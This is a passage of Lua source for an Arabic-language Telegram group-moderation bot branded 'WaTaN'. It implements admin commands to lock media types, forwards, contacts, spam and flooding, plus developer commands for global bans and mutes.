tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الاغاني بالتقييد ')
end,nil)   
elseif text == 'قفل الاغاني بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الاغاني بالكتم ')
end,nil)   
elseif text == 'قفل الاغاني بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الاغاني بالطرد ')
end,nil)   
elseif text == 'فتح الاغاني' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Audio"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الاغاني ')
end,nil)   
end
if text == 'قفل الصوت' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الصوت ')
end,nil)   
elseif text == 'قفل الصوت بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الصوت بالتقييد ')
end,nil)   
elseif text == 'قفل الصوت بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الصوت بالكتم ')
end,nil)   
elseif text == 'قفل الصوت بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الصوت بالطرد ')
end,nil)   
elseif text == 'فتح الصوت' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:vico"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الصوت ')
end,nil)   
end
if text == 'قفل الكيبورد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الكيبورد ')
end,nil)   
elseif text == 'قفل الكيبورد بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الكيبورد بالتقييد ')
end,nil)   
elseif text == 'قفل الكيبورد بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الكيبورد بالكتم ')  
end,nil)   
elseif text == 'قفل الكيبورد بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الكيبورد بالطرد ')  
end,nil)   
elseif text == 'فتح الكيبورد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Keyboard"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الكيبورد ')  
end,nil)   
end
if text == 'قفل الملصقات' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الملصقات ')  
end,nil)   
elseif text == 'قفل الملصقات بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الملصقات بالتقييد ')  
end,nil)
elseif text == 'قفل الملصقات بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الملصقات بالكتم ')  
end,nil)   
elseif text == 'قفل الملصقات بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الملصقات بالطرد ')  
end,nil)   
elseif text == 'فتح الملصقات' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الملصقات ')  
end,nil)   
end
if text == 'قفل التوجيه' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التوجيه ')  
end,nil)   
elseif text == 'قفل التوجيه بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التوجيه بالتقييد ')  
end,nil)
elseif text == 'قفل التوجيه بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التوجيه بالكتم ')  
end,nil)   
elseif text == 'قفل التوجيه بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التوجيه بالطرد ')  
end,nil)   
elseif text == 'فتح التوجيه' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:forward"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح التوجيه ')  
end,nil)   
end
if text == 'قفل الملفات' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الملفات ')  
end,nil)   
elseif text == 'قفل الملفات بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الملفات بالتقييد ')  
end,nil)
elseif text == 'قفل الملفات بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الملفات بالكتم ')  
end,nil)   
elseif text == 'قفل الملفات بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الملفات بالطرد ')  
end,nil)   
elseif text == 'فتح الملفات' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Document"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الملفات ')  
end,nil)   
end
if text == 'قفل السيلفي' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل السيلفي ')  
end,nil)   
elseif text == 'قفل السيلفي بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل السيلفي بالتقييد ')  
end,nil)
elseif text == 'قفل السيلفي بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل السيلفي بالكتم ')  
end,nil)   
elseif text == 'قفل السيلفي بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل السيلفي بالطرد ')  
end,nil)   
elseif text == 'فتح السيلفي' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Unsupported"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح السيلفي ')  
end,nil)   
end
if text == 'قفل الماركداون' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الماركداون ')  
end,nil)   
elseif text == 'قفل الماركداون بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الماركداون بالتقييد ')  
end,nil)
elseif text == 'قفل الماركداون بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الماركداون بالكتم ')  
end,nil)   
elseif text == 'قفل الماركداون بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الماركداون بالطرد ')  
end,nil)   
elseif text == 'فتح الماركداون' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Markdaun"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الماركداون ')  
end,nil)   
end
if text == 'قفل الجهات' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الجهات ')  
end,nil)   
elseif text == 'قفل الجهات بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الجهات بالتقييد ')  
end,nil)
elseif text == 'قفل الجهات بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الجهات بالكتم ')  
end,nil)   
elseif text == 'قفل الجهات بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الجهات بالطرد ')  
end,nil)   
elseif text == 'فتح الجهات' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Contact"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الجهات ')  
end,nil)   
end
if text == 'قفل الكلايش' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الكلايش ')  
end,nil)   
elseif text == 'قفل الكلايش بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الكلايش بالتقييد ')  
end,nil)
elseif text == 'قفل الكلايش بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الكلايش بالكتم ')  
end,nil)   
elseif text == 'قفل الكلايش بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الكلايش بالطرد ')  
end,nil)   
elseif text == 'فتح الكلايش' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الكلايش ')  
end,nil)   
end
if text == 'قفل التكرار بالطرد' and ChanSub(msg) and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
send(msg.chat_id_, msg.id_,'✯︙تم قفل التكرار بالطرد')
elseif text == 'قفل التكرار' and ChanSub(msg) and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,'✯︙تم قفل التكرار')
elseif text == 'قفل التكرار بالتقييد' and ChanSub(msg) and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,'✯︙تم قفل التكرار بالتقييد')
elseif text == 'قفل التكرار بالتقيد' and ChanSub(msg) and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,'✯︙تم قفل التكرار بالتقييد')
elseif text == 'قفل التكرار بالكتم' and ChanSub(msg) and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,'✯︙تم قفل التكرار بالكتم')
elseif text == 'فتح التكرار' and ChanSub(msg) and Mod(msg) then 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,'✯︙تم فتح التكرار')
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تحديث' and ChanSub(msg) and DevWaTaN(msg) then    
dofile('WaTaN.lua')  
send(msg.chat_id_, msg.id_, '✯︙تم تحديث جميع الملفات') 
end 
if text == ("مسح المحظورين عام") and ChanSub(msg) and DevWaTaN(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح المحظورين عام')
return false
end
if text == ("مسح المكتومين عام") and ChanSub(msg) and DevWaTaN(msg) then
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح قائمه المكتومين عام')
return false
end
if text == ("المحظورين عام") and ChanSub(msg) and DevWaTaN(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n✯︙قائمة المحظورين عام \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("حظر عام") and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ✯︙لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع حظر البوت عام")
return false 
end
database:sadd(bot_id..'GBan:User', result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم حظره عام من *'..Groups..'* كروب'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حظر عام @(.*)$") and ChanSub(msg)  and DevWaTaN(msg) then
local username = text:match("^حظر عام @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع حظر البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ✯︙لا يمكنك حظر المطور الاساسي \n")
return false 
end
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم حظره عام من *'..Groups..'* كروب'
texts = usertext..status
database:sadd(bot_id..'GBan:User', result.id_)
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
local userid = text:match("^حظر عام (%d+)$")
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ✯︙لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع حظر البوت عام")
return false 
end
database:sadd(bot_id..'GBan:User', userid)
